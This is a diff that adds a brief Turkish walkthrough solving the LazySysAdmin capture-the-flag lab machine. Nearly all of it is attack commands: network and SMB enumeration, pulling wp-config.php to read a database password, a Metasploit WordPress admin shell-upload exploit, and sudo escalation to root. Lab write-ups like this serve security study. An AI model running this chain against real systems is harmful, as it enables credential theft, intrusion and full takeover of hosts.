@@ -1,0 +1,10 @@
+LAZYSYSADMİN MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.148 bulundu.
+2 - nmap -sT -A 192.168.2.148
+3 - smbclient -L //192.168.2.148
+4 - smbclient //192.168.2.148/share$, mget *, cd wordpress, get wp-config.php
+5 - cat wp-config.php, Admin:TogieMYSQL12345^^
+6 - msfconsole, use exploit/unix/webapp/wp_admin_shell_upload
+7 - su togie
+8 - sudo -l
+9 - sudo su
